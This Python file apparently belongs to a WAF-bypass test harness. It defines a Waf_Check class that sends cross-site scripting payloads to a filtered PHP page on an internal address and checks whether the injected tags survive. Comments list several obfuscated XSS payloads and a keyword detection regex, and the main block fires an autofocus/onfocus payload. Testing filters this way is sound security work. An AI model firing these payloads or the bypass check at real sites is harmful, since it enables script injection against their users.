#-*- coding:utf-8 –*-

# import numpy as np
# import re
# import time
# import win32gui, win32ui, win32con, win32api
from selenium import webdriver
from lib.gym.envs.helper import Requset
from lib.helper.htmlparser import SearchInputInResponse, random_upper, getParamsFromHtml
#<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
#a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
#"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
#<input onblur=write(XSS) autofocus><input autofocus>
#<math><a xlink:href="//jsfiddle.net/t846h/">click
#<h1><font color=blue>hellox worldss</h1>
#LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>


class Waf_Check(object):
    def __init__(self):
        self.name="Waf_Check"
        # self.regXSS=r'(prompt|alert|confirm|expression])' \
        #             r'|(javascript|script|eval)' \
        #             r'|(onload|onerror|onfocus|onclick|ontoggle|onmousemove|ondrag)' \
        #             r'|(String.fromCharCode)' \
        #             r'|(;base64,)' \
        #             r'|(onblur=write)' \
        #             r'|(xlink:href)' \
        #             r'|(color=)'
        self.regXSS = r'(<|>)'



    def check_xss(self,payload=''):
        '''
        第一种方案：使用seleium来检测弹窗，优缺点：检测准确率高但效率低
        :param str: payload
        :return: alert or not
        option = webdriver.ChromeOptions()
        option.add_argument('headless')  # 设置option
        global driver
        driver = webdriver.Chrome(chrome_options=option)
        driver.get('http://127.0.0.1/waf_protected_xss.php?code='+str)
        isxss = False
        try:
            if driver.switch_to.alert:
                isxss = True
        except Exception:
            driver.close()
        return isxss
        '''
        pass
        '''
        第二种方案使用htmlparser解析树来判定是否生成目标探针的标签
        '''
        ##首先得到请求包
        isxss = False
        positon = 'GET'
        data = {'code':payload}
        ##这里可以直接给code，后面在req时会自动加上code的参数
        requests = Requset('http://10.136.128.55/waf_protected_xss.php?code=123').req(positon, data)
        _occerens = SearchInputInResponse('onfocus',requests.text)
        for i in _occerens:
            for _k, _v in i["details"]["attibutes"]:
                if _k == payload:
                    isxss = True
        return isxss



if __name__ == '__main__':
    waf=Waf_Check()
    waf.check_xss('"%0daUTOfOCUS%0dOnFoCUS="[8].find(confirm)')
    #checklistfile="../../xss-samples.txt"
    # checklistfile = "../../xss-samples-all.txt"
    #
    # with open(checklistfile) as f:
    #     for line in f:
    #         line=line.strip('\n')
    #         #print line
    #         if waf.check_xss(line):
    #             print("Match waf rule :")
    #             print(line)
